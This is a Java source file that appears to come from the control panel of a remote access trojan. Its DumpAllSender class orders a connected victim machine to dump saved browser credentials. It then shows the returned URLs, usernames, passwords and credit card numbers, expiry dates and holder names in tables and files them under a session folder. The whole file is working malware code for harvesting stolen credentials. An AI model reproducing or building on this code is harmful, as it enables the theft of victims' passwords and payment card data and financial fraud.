package GUI.TableUtils.Credentials;

import Connections.ClientErrorHandler;
import GUI.TableUtils.Credentials.Packets.AccountCredentials;
import GUI.TableUtils.Credentials.Packets.CombinedCredentials;
import GUI.TableUtils.Credentials.Packets.CreditCardCredentials;
import Information.Action;
import Information.Time;

import javax.swing.*;
import java.io.IOException;
import java.util.ArrayList;

public class DumpAllSender implements Runnable {

    private final CredentialsManagerGUI credentialsManagerGUI;

    public DumpAllSender(CredentialsManagerGUI credentialsManagerGUI) {
        this.credentialsManagerGUI = credentialsManagerGUI;
    }

    @Override
    public void run() {
        try {
            String nameOfSession = credentialsManagerGUI.getClientHandler().getSessionFolder() + "/" + "/Browser Credentials/" + new Time().getTime();
            CombinedCredentials combinedCredentials = credentialsManagerGUI.getStream().getCredentials(Action.DUMP_CREDENTIALS, nameOfSession);
            ArrayList<AccountCredentials> accountCredentials = (ArrayList<AccountCredentials>) combinedCredentials.accountCredentials();
            ArrayList<CreditCardCredentials> creditCardCredentials = (ArrayList<CreditCardCredentials>) combinedCredentials.creditCardCredentials();
            SwingUtilities.invokeLater(() -> {
                for (AccountCredentials e : accountCredentials) {
                    Object[] elements = {e.actionUrl(), e.originUrl(), e.username(), e.password(), e.creationDate(), e.lastUsedDate()};
                    credentialsManagerGUI.getAccountsTableModel().addRow(elements);
                }
                for (CreditCardCredentials e : creditCardCredentials) {
                    Object[] elements = {e.creditCardNumber(), e.expirationMonth(), e.expirationYear(), e.cardHolder()};
                    credentialsManagerGUI.getCreditCardsTableModel().addRow(elements);
                }
                credentialsManagerGUI.getDumpAllJButton().setEnabled(true);
            });

        } catch (IOException e) {
            new ClientErrorHandler("Unable to open message box, connection lost with client",
                    credentialsManagerGUI.getCredentialsManagerDialog(),
                    credentialsManagerGUI.getStream().getClientSocket());
        }
    }
}
